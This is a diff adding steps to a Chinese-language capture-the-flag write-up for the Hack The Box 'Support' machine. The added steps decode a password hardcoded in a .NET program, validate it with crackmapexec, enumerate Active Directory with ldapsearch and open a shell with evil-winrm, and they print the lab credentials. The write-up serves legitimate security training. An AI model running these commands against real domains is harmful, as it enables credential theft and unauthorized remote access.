@@ -1,5 +1,5 @@
 ---
-description: Easy / 分析程序文件 / 枚举 /
+description: Easy / 分析程序文件 / LDAP枚举 /
 ---
 
 # ✔️ Support
@@ -101,25 +101,55 @@ file UserInfo.exe
 
 <figure><img src="../../.gitbook/assets/18 (6).png" alt=""><figcaption></figcaption></figure>
 
+* 在protected目录下的.cctor()中找到编码后的密码：
 
+<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
 
+* python IDLE终端解码后得到明文密码：'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 
+```python
+from base64 import b64decode
+from itertools import cycle
+pass_b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = b"armando"
+enc = b64decode(pass_b64)
+[e^k^223 for e,k in zip(enc, cycle(key))]
+bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
+```
 
+<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
 
+* 使用crackmapexec验证一下凭证是否有用：
 
+```bash
+crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+```
 
-
-
-
-
+<figure><img src="../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
+* 因为该程序的代码中的ldapquery，用的是ldap协议，所以用ldapsearch和当前已获得的有效凭证列举出AD中所有的内容：
 
+<figure><img src="../../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
 
+```bash
+ldapsearch -H  'ldap://10.129.230.181' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
+```
 
+* 输出结构特别多，需要仔细查看才能发现其中的support账户里包含了一个info字段，里面的字符串看上去像是密码（因为其他账户没有info这个字段）：
 
+<figure><img src="../../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>
 
+* 尝试使用evil-winrm和这个凭证连接，获取到了shell：
+
+```bash
+evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
+```
+
+<figure><img src="../../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/26 (3).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
